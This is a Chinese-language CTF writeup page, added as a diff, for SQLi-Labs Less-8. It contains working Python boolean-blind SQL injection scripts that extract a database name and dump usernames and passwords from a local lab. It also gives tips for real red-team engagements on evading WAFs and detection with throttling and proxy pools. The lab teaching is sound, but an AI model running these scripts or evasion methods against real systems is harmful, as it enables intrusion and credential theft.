@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-8 布尔盲注与 Python 自动化 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-8 布尔盲注与 Python 自动化 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.24 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 盲注, Python自动化</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-8 (GET - Blind - Boolean Based - Single Quotes)</li>
+        <li><strong>提示：</strong>GET请求，基于布尔的盲注，单引号闭合</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡无数据回显且无报错信息。手工输入 <code>?id=1' AND 1=1 --+</code> 页面回显正常，输入 <code>?id=1' AND 1=2 --+</code> 页面异常。利用此 True/False 的差异，采用布尔盲注进行数据推断。由于手工猜解效率极低，本关采用 Python 编写自动化脚本，利用二分法算法提升猜解速度。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：环境准备与工具安装</strong></p>
+    <p>在 VS Code 终端中，安装用于发送 HTTP 请求的第三方库：</p>
+    <pre><code>py -m pip install requests</code></pre>
+
+    <p><strong>第二步：编写爆破当前数据库名脚本并解析</strong></p>
+    <p>新建文件编写以下代码。脚本核心逻辑是通过二分法，不断询问服务器“当前字符的 ASCII 码是否大于中间值”，根据回显的 True/False 缩小范围，从而锁定字符。</p>
+
+<pre><code>import requests
+
+url = "http://localhost/sqli-labs-master/Less-8/"
+success_flag = "You are in........"
+
+def get_ascii(payload):
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        full_url = f"{url}?id=1' AND {payload}&gt;{mid} --+"
+        response = requests.get(full_url)
+        if success_flag in response.text:
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def main():
+    print("[*] 开始爆破数据库名...")
+    db_name = ""
+    for i in range(1, 20):
+        subquery = f"ascii(substr((select database()),{i},1))"
+        ascii_code = get_ascii(subquery)
+        if ascii_code == 0 or ascii_code &gt; 126:
+            break
+        char = chr(ascii_code)
+        db_name += char
+        print(f"[+] 发现第 {i} 个字符: {char}，当前结果为: {db_name}")
+    print(f"[*] 爆破完成，当前数据库名为: {db_name}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+
+    <p><strong>代码成分解析：</strong></p>
+    <ul>
+        <li><code>requests.get()</code>：模拟浏览器向目标发送 GET 请求。</li>
+        <li><code>substr(字符串, i, 1)</code>：截取目标字符串的第 i 个字符。</li>
+        <li><code>ascii()</code>：将字符转为 ASCII 码，以便进行整数大小比较。</li>
+        <li><strong>二分法</strong>：在 32-126 的范围内，每次砍半比对。判断为真，说明目标值在右侧（<code>low = mid + 1</code>）；为假则在左侧（<code>high = mid - 1</code>）。</li>
+    </ul>
+    <p><strong>执行结果：</strong>终端输出 <code>s</code>, <code>e</code>, <code>c</code>... 最终得到 <code>security</code>。</p>
+
+    <p><strong>第三步：修改脚本爆破账号密码</strong></p>
+    <p>将代码中的 <code>subquery</code> 变量修改为查询账号密码的语句，并调大循环范围：</p>
+
+<pre><code>import requests
+
+url = "http://localhost/sqli-labs-master/Less-8/"
+success_flag = "You are in........"
+
+def get_ascii(payload):
+    low = 32
+    high = 126
+    while low &lt;= high:
+        mid = (low + high) // 2
+        full_url = f"{url}?id=1' AND {payload}&gt;{mid} --+"
+        response = requests.get(full_url)
+        if success_flag in response.text:
+            low = mid + 1
+        else:
+            high = mid - 1
+    return low
+
+def main():
+    print("[*] 开始爆破账号密码...")
+    result = ""
+    # 密码拼接较长，范围调大
+    for i in range(1, 200):
+        # 使用 0x3a (:) 分隔账号和密码
+        subquery = f"ascii(substr((select group_concat(username,0x3a,password) from security.users),{i},1))"
+        ascii_code = get_ascii(subquery)
+        if ascii_code == 0 or ascii_code &gt; 126:
+            break
+        char = chr(ascii_code)
+        result += char
+        print(f"[+] 发现第 {i} 个字符: {char}，当前结果为: {result}")
+    print(f"[*] 爆破完成，账号密码结果为: {result}")
+
+if __name__ == "__main__":
+    main()</code></pre>
+    <p><strong>执行结果：</strong>终端成功打印出 <code>Dumb:Dumb,Angelina:I-kill-you... </code> 等完整数据。由于循环上限设置，数据可能截断，调整 <code>range</code> 上限即可解决。</p>
+
+    <h2>4. 踩坑记录与实战复盘</h2>
+    <ul>
+        <li><strong>数据截断问题：</strong>循环的 <code>range</code> 限制了抓取长度，若需完整数据，调大循环范围或通过判断返回值是否为 0 自动跳出。</li>
+        <li><strong>红蓝对抗实战思考：</strong>在真实的 HVV 场景中，大量并发的盲注脚本请求极易触发 WAF 拦截或被蓝方应急响应发现。实战中应采取降速（如加入 <code>time.sleep</code>）、使用代理池，或优先尝试更高效的 GetShell 手段。此外，实战中获取完整的明文密码耗时极长，通常只需证明漏洞存在（如爆出库名），或获取密码哈希后导出至本地进行离线破解。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>布尔盲注：</strong>利用页面回显的差异作为 True/False 判定依据，通过逻辑推断获取数据。</li>
+        <li><strong>二分法：</strong>用于快速缩小目标字符的 ASCII 码范围，大幅减少请求次数。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
